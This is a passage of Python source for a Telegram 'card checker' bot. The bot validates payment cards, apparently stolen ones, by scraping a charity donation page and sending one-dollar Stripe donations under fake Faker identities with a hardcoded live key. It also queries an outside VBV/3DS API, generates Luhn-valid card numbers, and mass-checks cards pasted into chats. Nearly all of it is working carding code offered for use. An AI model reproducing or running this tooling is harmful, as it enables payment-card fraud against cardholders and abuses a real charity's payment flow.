import logging
import requests
import uuid
import random
from bs4 import BeautifulSoup
from faker import Faker
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputMediaAnimation
from telegram.ext import Application, CommandHandler, CallbackContext, CallbackQueryHandler
import time
import re
import json
import os
from datetime import datetime

# Configuration
OWNER_NAME = "@RAJARAJ909"
BOT_NAME = "█▓▒▒░░░@Rajaccheckersbot░░░▒▒▓█"
ADMIN_IDS = [7681062358]  # Replace with your Telegram ID
VBV_API_URL = "https://vbv-by-dark-waslost.onrender.com/key=darkwaslost/cc="
GEN_API_URL = "https://drlabapis.onrender.com/api/ccgenerator?bin={}&count=10"
USER_DATA_FILE = "user_data.json"
GROUP_DATA_FILE = "group_data.json"

# Setup Faker
faker = Faker('en_US')
guid = str(uuid.uuid4())
muid = str(uuid.uuid4())
sid = str(uuid.uuid4())

# Load user data
if os.path.exists(USER_DATA_FILE):
    with open(USER_DATA_FILE, 'r') as f:
        user_data = json.load(f)
else:
    user_data = {"users": {}, "banned": [], "approved": [], "premium_users": []}

# Load group data
if os.path.exists(GROUP_DATA_FILE):
    with open(GROUP_DATA_FILE, 'r') as f:
        group_data = json.load(f)
else:
    group_data = {"approved_groups": []}

def save_user_data():
    with open(USER_DATA_FILE, 'w') as f:
        json.dump(user_data, f)

def save_group_data():
    with open(GROUP_DATA_FILE, 'w') as f:
        json.dump(group_data, f)

# Stylish message templates
def generate_border(text, length=50, char="━"):
    border = char * length
    return f"┏{border}┓\n┃{text.center(length)}┃\n┗{border}┛"

def create_header(title):
    return f"╔═══════ ⋆★⋆ ═══════╗\n         {title}\n╚═══════ ⋆★⋆ ═══════╝"

def create_footer(text):
    return f"✦ {text} ✦".center(50, "✧")

def format_card_info(cc, mes, ano, cvv):
    return (
        f"🄲🄰🅁🄳 ➔ {cc[:6]}𝗫𝗫𝗫𝗫𝗫𝗫{cc[-2:]} | {mes} | {ano} | 𝗫𝗫𝗫\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )

def format_response(status, message):
    icon = "✅" if "approved" in status.lower() else "❌"
    return (
        f"🅂🅃🄰🅃🅄🅂 ➔ {icon} {status}\n"
        f"🄼🄴🅂🅂🄰🄶🄴 ➔ {message}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )

def get_bin_info(bin_number):
    try:
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_number[:6]}", timeout=10)
        if response.status_code == 200:
            data = response.json()
            return {
                "type": data.get("type", "𝗨𝗡𝗞𝗡𝗢𝗪𝗡"),
                "country": data.get("country", "𝗨𝗡𝗞𝗡𝗢𝗪𝗡"),
                "bank": data.get("bank", "𝗨𝗡𝗞𝗡𝗢𝗪𝗡"),
                "level": data.get("level", "𝗨𝗡𝗞𝗡𝗢𝗪𝗡"),
                "vendor": data.get("vendor", "𝗨𝗡𝗞𝗡𝗢𝗪𝗡")
            }
    except Exception as e:
        logging.error(f"Error fetching BIN info: {e}")
    return {
        "type": "𝗨𝗡𝗞𝗡𝗢𝗪𝗡",
        "country": "𝗨𝗡𝗞𝗡𝗢𝗪𝗡",
        "bank": "𝗨𝗡𝗞𝗡𝗢𝗪𝗡",
        "level": "𝗨𝗡𝗞𝗡𝗢𝗪𝗡",
        "vendor": "𝗨𝗡𝗞𝗡𝗢𝗪𝗡"
    }

def generate_random_cc(bin_pattern=None):
    if not bin_pattern or len(bin_pattern) < 6:
        bin_pattern = "4" + "".join(random.choices("0123456789", k=5))
    
    cc = bin_pattern
    while len(cc) < 16:
        cc += random.choice("0123456789")
    
    cc = cc[:15] + str(calculate_luhn(cc[:15]))
    return cc

def calculate_luhn(cc_number):
    num = list(map(int, cc_number))
    check_digit = (
        10 - (sum(num[-2::-2] + [sum(divmod(d * 2, 10)) for d in num[::-2]])) % 10
    ) % 10
    return check_digit

def get_card_type(card_number):
    if card_number.startswith('4'):
        return '𝗩𝗜𝗦𝗔'
    elif card_number.startswith(('51', '52', '53', '54', '55')):
        return '𝗠𝗔𝗦𝗧𝗘𝗥𝗖𝗔𝗥𝗗'
    elif card_number.startswith(('34', '37')):
        return '𝗔𝗠𝗘𝗫'
    elif card_number.startswith('36'):
        return '𝗗𝗜𝗡𝗘𝗥𝗦 𝗖𝗟𝗨𝗕'
    elif card_number.startswith('6011'):
        return '𝗗𝗜𝗦𝗖𝗢𝗩𝗘𝗥'
    else:
        return '𝗨𝗡𝗞𝗡𝗢𝗪𝗡'

def get_card_issuer(card_number):
    return '𝗗𝗘𝗕𝗜𝗧' if int(card_number[0]) % 2 == 0 else '𝗖𝗥𝗘𝗗𝗜𝗧'

async def send_processing_message(update, message):
    processing_gifs = [
        "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExcGQ1a2V0d2VjY2JxY3V1b3F1b2J5cG5yZ2x1eGJ6c2RzZ2VtYSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o7bu3XilJ5BOiSGic/giphy.gif",
        "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExcGQ1a2V0d2VjY2JxY3V1b3F1b2J5cG5yZ2x1eGJ6c2RzZ2VtYSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/l0HU7JI1m1yZ18Xk4/giphy.gif",
        "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExcGQ1a2V0d2VjY2JxY3V1b3F1b2J5cG5yZ2x1eGJ6c2RzZ2VtYSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3oEjI6SIIHBdRxXI40/giphy.gif",
        "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExcGQ1a2V0d2VjY2JxY3V1b3F1b2J5cG5yZ2x1eGJ6c2RzZ2VtYSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/xTk9ZvMnbIiIew7IpW/giphy.gif",
        "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExcGQ1a2V0d2VjY2JxY3V1b3F1b2J5cG5yZ2x1eGJ6c2RzZ2VtYSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o7aTskHEUdgCQAXde/giphy.gif"
    ]
    
    progress = random.randint(25, 75)
    progress_bar = "🟢" * (progress // 10) + "⚪" * (10 - (progress // 10))
    caption = f"🌀 {message}\n\n{progress_bar} {progress}%\n\n𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁..."
    
    return await update.message.reply_animation(
        random.choice(processing_gifs),
        caption=caption
    )

async def update_processing_message(message_obj, new_text, progress):
    progress_bar = "🟢" * (progress // 10) + "⚪" * (10 - (progress // 10))
    new_caption = f"🌀 {new_text}\n\n{progress_bar} {progress}%\n\n𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁..."
    
    try:
        await message_obj.edit_caption(caption=new_caption)
    except Exception as e:
        logging.error(f"Error updating processing message: {e}")

async def check_vbv_status(card_string):
    try:
        url = f"{VBV_API_URL}{card_string}"
        response = requests.get(url, timeout=15)
        if response.status_code == 200:
            data = response.json()
            return data.get("status", "𝗨𝗡𝗞𝗡𝗢𝗪𝗡"), data.get("message", "𝗡𝗼 𝗺𝗲𝘀𝘀𝗮𝗴𝗲")
        return "𝗨𝗡𝗞𝗡𝗢𝗪𝗡", "𝗔𝗣𝗜 𝗘𝗿𝗿𝗼𝗿"
    except Exception as e:
        logging.error(f"VBV API Error: {e}")
        return "𝗨𝗡𝗞𝗡𝗢𝗪𝗡", str(e)

async def check_user_access(update: Update):
    user_id = str(update.effective_user.id)
    chat_id = str(update.effective_chat.id)
    
    # Check if in private chat
    if update.effective_chat.type == "private":
        if user_id in user_data.get("banned", []):
            await update.message.reply_text("🚫 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗯𝗮𝗻𝗻𝗲𝗱 𝗳𝗿𝗼𝗺 𝘂𝘀𝗶𝗻𝗴 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁!")
            return False
        
        if user_id not in user_data.get("approved", []):
            await update.message.reply_text(
                "⏳ 𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗲𝘀𝘀 𝗶𝘀 𝗽𝗲𝗻𝗱𝗶𝗻𝗴 𝗮𝗽𝗽𝗿𝗼𝘃𝗮𝗹.\n\n"
                "𝗔𝗻 𝗮𝗱𝗺𝗶𝗻 𝘄𝗶𝗹𝗹 𝗿𝗲𝘃𝗶𝗲𝘄 𝘆𝗼𝘂𝗿 𝗿𝗲𝗾𝘂𝗲𝘀𝘁 𝘀𝗼𝗼𝗻.\n"
                f"𝗬𝗼𝘂𝗿 𝗜𝗗: {user_id}"
            )
            # Notify admin
            for admin_id in ADMIN_IDS:
                try:
                    await update._bot.send_message(
                        admin_id,
                        f"🆕 𝗡𝗲𝘄 𝘂𝘀𝗲𝗿 𝗿𝗲𝗾𝘂𝗲𝘀𝘁𝗶𝗻𝗴 𝗮𝗰𝗰𝗲𝘀𝘀:\n\n"
                        f"🆔: {user_id}\n"
                        f"👤: {update.effective_user.full_name}\n"
                        f"📅: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                        f"𝗨𝘀𝗲 /add_user {user_id} 𝘁𝗼 𝗮𝗽𝗽𝗿𝗼𝘃𝗲"
                    )
                except Exception as e:
                    logging.error(f"Error notifying admin: {e}")
            return False
    else:
        # Group chat - check if group is approved
        if chat_id not in group_data.get("approved_groups", []):
            await update.message.reply_text("🚫 𝗧𝗵𝗶𝘀 𝗴𝗿𝗼𝘂𝗽 𝗶𝘀 𝗻𝗼𝘁 𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁!")
            return False
        
        # Check if user is banned
        if user_id in user_data.get("banned", []):
            await update.message.reply_text("🚫 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗯𝗮𝗻𝗻𝗲𝗱 𝗳𝗿𝗼𝗺 𝘂𝘀𝗶𝗻𝗴 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁!")
            return False
    
    return True

async def check_card(update: Update, context: CallbackContext, cc, mes, ano, cvv, checker_name):
    if not await check_user_access(update):
        return

    start_time = time.time()
    bin_info = get_bin_info(cc[:6])
    card_type = bin_info['type']
    country = bin_info['country']
    bank = bin_info['bank']
    card_level = bin_info['level']
    vendor = bin_info['vendor']
    card_issuer = get_card_issuer(cc)
    
    processing_msg = await send_processing_message(
        update,
        f"🔍 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗰𝗮𝗿𝗱: {cc[:6]}𝗫𝗫𝗫𝗫𝗫𝗫"
    )

    try:
        await update_processing_message(processing_msg, "🔍 𝗩𝗲𝗿𝗶𝗳𝘆𝗶𝗻𝗴 𝗰𝗮𝗿𝗱 𝗱𝗲𝘁𝗮𝗶𝗹𝘀...", 30)
        
        se = requests.Session()
        headers = {
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
        }

        await update_processing_message(processing_msg, "🌐 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗶𝗻𝗴 𝘁𝗼 𝗽𝗮𝘆𝗺𝗲𝗻𝘁 𝗴𝗮𝘁𝗲𝘄𝗮𝘆...", 50)
        html = se.get('https://needhelped.com/campaigns/poor-children-donation-4/donate/', headers=headers, timeout=15)
        soup = BeautifulSoup(html.text, 'html.parser')
        charitable_form_id = soup.find('input', {'name': 'charitable_form_id'})['value']
        charitable_donation_nonce = soup.find('input', {'name': '_charitable_donation_nonce'})['value']

        fake_name = faker.name()
        fake_email = f"{faker.first_name().lower()}{random.randint(100000000, 999999999)}@gmail.com"
        fake_zip = faker.zipcode()

        await update_processing_message(processing_msg, "🔐 𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝗽𝗮𝘆𝗺𝗲𝗻𝘁...", 70)
        data = f'type=card&billing_details[name]={fake_name}&billing_details[email]={fake_email}&billing_details[address][city]=CONCORD&billing_details[address][country]=AU&billing_details[address][line1]=30+Sydney+Street&billing_details[address][postal_code]={fake_zip}&billing_details[address][state]=NSW&billing_details[phone]=0212+121+212&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid={guid}&muid={muid}&sid={sid}&payment_user_agent=stripe.js%2F1cb064bd1e%3B+stripe-js-v3%2F1cb064bd1e%3B+card-element&referrer=https%3A%2F%2Fneedhelped.com&time_on_page=1321663&key=pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr'
        response = se.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=15)
        payment_method_id = response.json()['id']

        headers = {
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://needhelped.com',
            'referer': 'https://needhelped.com/campaigns/poor-children-donation-4/donate/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
        }

        data = {
            'charitable_form_id': charitable_form_id,
            f'{charitable_form_id}': '',
            '_charitable_donation_nonce': charitable_donation_nonce,
            '_wp_http_referer': '/campaigns/poor-children-donation-4/donate/',
            'campaign_id': '1164',
            'description': 'Poor Children Donation Support',
            'ID': '0',
            'donation_amount': 'custom',
            'custom_donation_amount': '1.00',
            'first_name': fake_name.split()[0],
            'last_name': fake_name.split()[1],
            'email': fake_email,
            'address': '30 Sydney Street',
            'address_2': '',
            'city': 'CONCORD',
            'state': 'NSW',
            'postcode': '2137',
            'country': 'AU',
            'phone': '0212 121 212',
            'gateway': 'stripe',
            'stripe_payment_method': payment_method_id,
            'action': 'make_donation',
            'form_action': 'make_donation',
        }

        await update_processing_message(processing_msg, "✅ 𝗙𝗶𝗻𝗮𝗹𝗶𝘇𝗶𝗻𝗴 𝗰𝗵𝗲𝗰𝗸...", 90)
        response = se.post('https://needhelped.com/wp-admin/admin-ajax.php', headers=headers, data=data, timeout=15)
        data = response.json()
        
        end_time = time.time()
        elapsed_time = round(end_time - start_time, 2)

        if data.get('success') is True:
            status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
            response_msg = "𝗬𝗼𝘂𝗿 𝗰𝗮𝗿𝗱 𝘄𝗮𝘀 𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱."
            is_approved = True
        else:
            status = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌"
            response_msg = data['errors'][0] if 'errors' in data else "𝗬𝗼𝘂𝗿 𝗰𝗮𝗿𝗱 𝘄𝗮𝘀 𝗱𝗲𝗰𝗹𝗶𝗻𝗲𝗱."
            is_approved = False

        result_message = (
            f"{create_header('𝗖𝗔𝗥𝗗 𝗖𝗛𝗘𝗖𝗞 𝗥𝗘𝗦𝗨𝗟𝗧')}\n\n"
            f"{format_card_info(cc, mes, ano, cvv)}\n"
            f"{format_response(status, response_msg)}\n\n"
            f"𝗜𝗻𝗳𝗼: {card_type} • {card_level} • {vendor}\n"
            f"𝗕𝗮𝗻𝗸: {bank}\n"
            f"𝗜𝘀𝘀𝘂𝗲𝗿: {card_issuer}\n"
            f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}\n\n"
            f"̲𝗖𝗛𝗘𝗖𝗞𝗘𝗥: {checker_name}\n"
            f"𝗕𝗢𝗧 𝗡𝗔𝗠𝗘: {OWNER_NAME}\n"
            f"𝗧𝗶𝗺𝗲: {elapsed_time} 𝗦𝗲𝗰𝗼𝗻𝗱𝘀\n"
            f"{create_footer(BOT_NAME)}"
        )
        await processing_msg.delete()
        await update.message.reply_text(result_message)
        return is_approved
    
    except Exception as e:
        end_time = time.time()
        elapsed_time = round(end_time - start_time, 2)
        error_message = (
            f"{create_header('𝗘𝗥𝗥𝗢𝗥 𝗢𝗖𝗖𝗨𝗥𝗥𝗘𝗗')}\n\n"
            f"{format_card_info(cc, mes, ano, cvv)}\n"
            f"{format_response('𝗘𝗿𝗿𝗼𝗿 ❌', str(e))}\n\n"
            f"𝗜𝗻𝗳𝗼: {card_type} • {card_level} • {vendor}\n"
            f"𝗕𝗮𝗻𝗸: {bank}\n"
            f"𝗜𝘀𝘀𝘂𝗲𝗿: {card_issuer}\n"
            f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}\n\n"
            f"̲𝗖𝗛𝗘𝗖𝗞𝗘𝗥: {checker_name}\n"
            f"𝗕𝗢𝗧 𝗡𝗔𝗠𝗘: {OWNER_NAME}\n"
            f"𝗧𝗶𝗺𝗲: {elapsed_time} 𝗦𝗲𝗰𝗼𝗻𝗱𝘀\n"
            f"{create_footer(BOT_NAME)}"
        )
        await processing_msg.delete()
        await update.message.reply_text(error_message)
        return False

async def chk(update: Update, context: CallbackContext):
    if not await check_user_access(update):
        return

    if len(context.args) != 1:
        await update.message.reply_text("❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗳𝗼𝗿𝗺𝗮𝘁. 𝗨𝘀𝗲: /chk 𝗰𝗰|𝗺𝗺|𝘆𝘆|𝗰𝘃𝘃")
        return
    
    card = context.args[0].split('|')
    if len(card) != 4:
        await update.message.reply_text("❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗰𝗮𝗿𝗱 𝗳𝗼𝗿𝗺𝗮𝘁. 𝗨𝘀𝗲: /chk 𝗰𝗰|𝗺𝗺|𝘆𝘆|𝗰𝘃𝘃")
        return

    cc, mes, ano, cvv = card
    checker_name = update.effective_user.full_name
    
    await check_card(update, context, cc, mes, ano, cvv, checker_name)

async def vbv(update: Update, context: CallbackContext):
    if not await check_user_access(update):
        return

    if len(context.args) != 1:
        await update.message.reply_text("❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗳𝗼𝗿𝗺𝗮𝘁. 𝗨𝘀𝗲: /vbv 𝗰𝗰|𝗺𝗺|𝘆𝘆|𝗰𝘃𝘃")
        return

    card = context.args[0].split('|')
    if len(card) != 4:
        await update.message.reply_text("❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗰𝗮𝗿𝗱 𝗳𝗼𝗿𝗺𝗮𝘁. 𝗨𝘀𝗲: /vbv 𝗰𝗰|𝗺𝗺|𝘆𝘆|𝗰𝘃𝘃")
        return

    cc, mes, ano, cvv = card
    full_card = f"{cc}|{mes}|{ano}|{cvv}"
    checker = update.effective_user.full_name
    user_type = "[𝗣𝗿𝗲𝗺𝗶𝘂𝗺]" if str(update.effective_user.id) in user_data.get("premium_users", []) else "[𝗙𝗿𝗲𝗲]"

    start = time.time()
    processing_msg = await send_processing_message(
        update,
        f"🔐 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗩𝗕𝗩 𝘀𝘁𝗮𝘁𝘂𝘀 𝗳𝗼𝗿: {cc[:6]}𝗫𝗫𝗫𝗫𝗫𝗫"
    )
    
    vbv_status, vbv_message = await check_vbv_status(full_card)
    bin_info = get_bin_info(cc[:6])
    card_type = get_card_type(cc)
    issuer_type = get_card_issuer(cc)
    end = time.time()
    elapsed = round(end - start, 2)

    approved = vbv_status.lower() in ["vbv", "✅ passed", "approved", "success"] or "success" in vbv_message.lower()
    box_title = "✅ 𝟯𝗗𝗦 𝗔𝘂𝘁𝗵𝗲𝗻𝘁𝗶𝗰𝗮𝘁𝗶𝗼𝗻 𝗣𝗮𝘀𝘀𝗲𝗱" if approved else "❌ 𝟯𝗗𝗦 𝗔𝘂𝘁𝗵𝗲𝗻𝘁𝗶𝗰𝗮𝘁𝗶𝗼𝗻 𝗙𝗮𝗶𝗹𝗲𝗱"
    response_line = "✅ " + vbv_message if approved else "❌ " + vbv_message

    country = bin_info.get("country", "𝗨𝗡𝗞𝗡𝗢𝗪𝗡").upper()
    flags = {
        "UNITED STATES": "🇺🇸", "INDIA": "🇮🇳", "CANADA": "🇨🇦",
        "UNITED KINGDOM": "🇬🇧", "AUSTRALIA": "🇦🇺"
    }
    flag = flags.get(country, "🌍")

    bank = bin_info.get("bank", "𝗨𝗡𝗞𝗡𝗢𝗪𝗡")
    level = bin_info.get("level", "")
    vendor = bin_info.get("vendor", "")
    card_type_full = f"{card_type} • {issuer_type} • {level or vendor or '𝗦𝗧𝗔𝗡𝗗𝗔𝗥𝗗'}"

    msg = (
        f"{create_header('𝗩𝗕𝗩 𝗔𝗨𝗧𝗛 𝗥𝗘𝗦𝗨𝗟𝗧')}\n\n"
        f"{format_card_info(cc, mes, ano, cvv)}\n"
        f"{format_response(box_title, response_line)}\n\n"
        f"𝗜𝗻𝗳𝗼: {card_type_full}\n"
        f"𝗕𝗮𝗻𝗸: {bank}\n"
        f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}\n\n"
        f"̲𝗖𝗛𝗘𝗖𝗞𝗘𝗥: {checker} {user_type}\n"
        f"𝗕𝗢𝗧 𝗡𝗔𝗠𝗘: {OWNER_NAME}\n"
        f"𝗧𝗶𝗺𝗲: {elapsed} 𝗦𝗲𝗰𝗼𝗻𝗱𝗱𝘀\n"
        f"{create_footer(BOT_NAME)}"
    )

    await processing_msg.delete()
    await update.message.reply_text(msg)

    # Continue with Stripe auth
    await check_card(update, context, cc, mes, ano, cvv, checker)

async def cchk(update: Update, context: CallbackContext):
    if not await check_user_access(update):
        return

    if not update.message.reply_to_message:
        await update.message.reply_text("❌ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗿𝗲𝗽𝗹𝘆 𝘁𝗼 𝗮 𝗺𝗲𝘀𝘀𝗮𝗴𝗲 𝗰𝗼𝗻𝘁𝗮𝗶𝗻𝗶𝗻𝗴 𝗰𝗮𝗿𝗱𝘀 𝘄𝗶𝘁𝗵 /cchk")
        return

    replied_text = update.message.reply_to_message.text
    card_matches = re.findall(r'\d{16}\|\d{2}\|\d{2,4}\|\d{3,4}', replied_text)

    if not card_matches:
        await update.message.reply_text("❌ 𝗡𝗼 𝘃𝗮𝗹𝗶𝗱 𝗰𝗮𝗿𝗱𝘀 𝗳𝗼𝘂𝗻𝗱 𝗶𝗻 𝘁𝗵𝗲 𝗺𝗲𝘀𝘀𝗮𝗴𝗲!")
        return

    progress_msg = await update.message.reply_text(
        f"⚡ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 {len(card_matches)} 𝗰𝗮𝗿𝗱𝘀...\n"
        f"⏳ 𝗘𝘀𝘁𝗶𝗺𝗮𝘁𝗲𝗱 𝘁𝗶𝗺𝗲: {len(card_matches)*2} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀"
    )

    approved_cards = []
    declined_cards = []
    error_cards = []
    
    for i, card in enumerate(card_matches, 1):
        try:
            cc, mes, ano, cvv = card.split('|')
            ano = ano[-2:]  # Ensure 2-digit year
            
            # Perform the actual check
            is_approved = await check_card(update, context, cc, mes, ano, cvv, update.effective_user.full_name)
            
            if is_approved:
                approved_cards.append(card)
            else:
                declined_cards.append(card)
        except Exception as e:
            error_cards.append(f"{card} (Error: {str(e)})")
        
        # Update progress every 5 cards or when done
        if i % 5 == 0 or i == len(card_matches):
            await progress_msg.edit_text(
                f"🔍 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀: {i}/{len(card_matches)} 𝗰𝗮𝗿𝗱𝘀 𝗰𝗵𝗲𝗰𝗸𝗲𝗱\n"
                f"✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱: {len(approved_cards)} | ❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱: {len(declined_cards)}\n"
                f"⚠️ 𝗘𝗿𝗿𝗼𝗿𝘀: {len(error_cards)}"
            )

    # Prepare final results
    result_message = f"📊 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸 𝗥𝗲𝘀𝘂𝗹𝘁𝘀 ({len(card_matches)} 𝗰𝗮𝗿𝗱𝘀):\n\n"
    result_message += f"✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱: {len(approved_cards)}\n"
    result_message += f"❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱: {len(declined_cards)}\n"
    result_message += f"⚠️ 𝗘𝗿𝗿𝗼𝗿𝘀: {len(error_cards)}\n\n"
    
    if approved_cards:
        result_message += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        result_message += "💳 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗖𝗮𝗿𝗱𝘀:\n"
        result_message += "\n".join(approved_cards[:15])  # Show first 15 approved cards
        if len(approved_cards) > 15:
            result_message += f"\n...𝗮𝗻𝗱 {len(approved_cards)-15} 𝗺𝗼𝗿𝗲"
    
    if declined_cards:
        result_message += "\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        result_message += "💳 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 𝗖𝗮𝗿𝗱𝘀:\n"
        result_message += "\n".join(declined_cards[:10])  # Show first 10 declined
        if len(declined_cards) > 10:
            result_message += f"\n...𝗮𝗻𝗱 {len(declined_cards)-10} 𝗺𝗼𝗿𝗲"
    
    if error_cards:
        result_message += "\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        result_message += "⚠️ 𝗘𝗿𝗿𝗼𝗿 𝗖𝗮𝗿𝗱𝘀:\n"
        result_message += "\n".join(error_cards[:5])  # Show first 5 errors
        if len(error_cards) > 5:
            result_message += f"\n...𝗮𝗻𝗱 {len(error_cards)-5} 𝗺𝗼𝗿𝗲"
    
    result_message += f"\n\n{create_footer(BOT_NAME)}"
    
    # Split long messages into multiple parts
    max_length = 4000  # Telegram message limit
    message_parts = [result_message[i:i+max_length] for i in range(0, len(result_message), max_length)]
    
    await progress_msg.delete()
    for part in message_parts:
        await update.message.reply_text(part)

async def mass(update: Update, context: CallbackContext):
    if not await check_user_access(update):
        return

    try:
        if not update.message.reply_to_message:
            await update.message.reply_text("❌ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗿𝗲𝗽𝗹𝘆 𝘁𝗼 𝗴𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝗰𝗮𝗿𝗱𝘀 𝘄𝗶𝘁𝗵 `/mass`")
            return

        replied_text = update.message.reply_to_message.text
        card_matches = re.findall(
            r'(?:\d{4}[‍ ]?){3}\d{4}\|\d{2}\|\d{2,4}\|\d{3,4}', 
            replied_text
        )

        if not card_matches:
            await update.message.reply_text("❌ 𝗡𝗼 𝘃𝗮𝗹𝗶𝗱 𝗰𝗮𝗿𝗱𝘀 𝗳𝗼𝘂𝗻𝗱 𝗶𝗻 𝘁𝗵𝗲 𝗺𝗲𝘀𝘀𝗮𝗴𝗲!")
            return

        valid_cards = []
        for card in card_matches:
            clean_card = card.replace('‍', '').replace(' ', '')
            if re.fullmatch(r'\d{16}\|\d{2}\|\d{2,4}\|\d{3,4}', clean_card):
                valid_cards.append(clean_card)

        if not valid_cards:
            await update.message.reply_text("❌ 𝗡𝗼 𝗽𝗿𝗼𝗽𝗲𝗿𝗹𝘆 𝗳𝗼𝗿𝗺𝗮𝘁𝘁𝗲𝗱 𝗰𝗮𝗿𝗱𝘀 𝗳𝗼𝘂𝗻𝗱!")
            return

        progress_msg = await update.message.reply_text(
            f"⚡ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 {len(valid_cards)} 𝗰𝗮𝗿𝗱𝘀...\n"
            f"⏳ 𝗘𝘀𝘁𝗶𝗺𝗮𝘁𝗲𝗱 𝘁𝗶𝗺𝗲: {len(valid_cards)*2} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀"
        )

        approved_cards = []
        declined_cards = []
        
        for i, card in enumerate(valid_cards, 1):
            cc, mes, ano, cvv = card.split('|')
            ano = ano[-2:]
            
            is_approved = await check_card(update, context, cc, mes, ano, cvv, update.effective_user.full_name)
            
            if is_approved:
                approved_cards.append(card)
            else:
                declined_cards.append(card)

            if i % 3 == 0:
                await progress_msg.edit_text(
                    f"🔍 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀: {i}/{len(valid_cards)} 𝗰𝗮𝗿𝗱𝘀 𝗰𝗵𝗲𝗰𝗸𝗲𝗱\n"
                    f"✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱: {len(approved_cards)} | ❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱: {len(declined_cards)}\n"
                    f"𝗟𝗮𝘀𝘁 𝗰𝗵𝗲𝗰𝗸𝗲𝗱: {cc[:6]}𝗫𝗫𝗫𝗫𝗫𝗫|{mes}|{ano}|𝗫𝗫𝗫"
                )

        # Prepare final results
        result_message = f"📊 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸 𝗥𝗲𝘀𝘂𝗹𝘁𝘀:\n\n"
        result_message += f"✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗖𝗮𝗿𝗱𝘀: {len(approved_cards)}\n"
        result_message += f"❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 𝗖𝗮𝗿𝗱𝘀: {len(declined_cards)}\n\n"
        
        if approved_cards:
            result_message += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            result_message += "💳 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗖𝗮𝗿𝗱𝘀:\n"
            result_message += "\n".join(approved_cards[:10])  # Show first 10 to avoid message too long
            if len(approved_cards) > 10:
